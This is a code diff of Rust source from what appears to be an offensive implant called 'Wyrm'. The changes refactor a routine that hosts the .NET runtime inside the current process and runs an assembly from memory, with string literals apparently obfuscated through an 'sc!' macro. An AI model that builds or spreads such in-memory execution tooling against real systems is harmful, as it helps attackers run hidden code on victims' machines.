@@ -34,7 +34,6 @@ pub enum DotnetError {
     ArgPutFailed(i32),
     AssemblyDataNull,
     SafeArrayNotInitialised,
-    NoArgsInInput,
     SafeArrayAccessUnaccessFail(i32),
     BadEntrypoint(i32),
     Load3Failed(i32),
@@ -76,7 +75,6 @@ impl DotnetError {
                     sc!("Could not put args in commandline. Error code:", 73).unwrap()
                 )
             }
-            DotnetError::NoArgsInInput => sc!("There were no arguments in the input.", 26).unwrap(),
             DotnetError::SafeArrayAccessUnaccessFail(i) => {
                 format!(
                     "{} {i:#X}",
@@ -154,7 +152,7 @@ pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<S
     };
 
     match execute_dotnet_assembly(&deser.0, &deser.1) {
-        Ok(_) => WyrmResult::Ok(sc!("Assembly running.", 49).unwrap()),
+        Ok(s) => WyrmResult::Ok(s),
         Err(e) => WyrmResult::Err(format!(
             "{} {}",
             sc!("Error received during execution:", 56).unwrap(),
@@ -163,7 +161,7 @@ pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<S
     }
 }
 
-fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetError> {
+fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<String, DotnetError> {
     //
     // Load the CLR into the process and setup environment to support
     //
@@ -225,7 +223,7 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<(), DotnetErro
     let vt = unsafe { &(*(*entryp).vtable) };
     unsafe { (vt.Invoke_3)(entryp as *mut _, object, p_args, &mut retval) };
 
-    Ok(())
+    Ok(sc!("Dotnet task running", 49).unwrap())
 }
 
 fn make_params(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
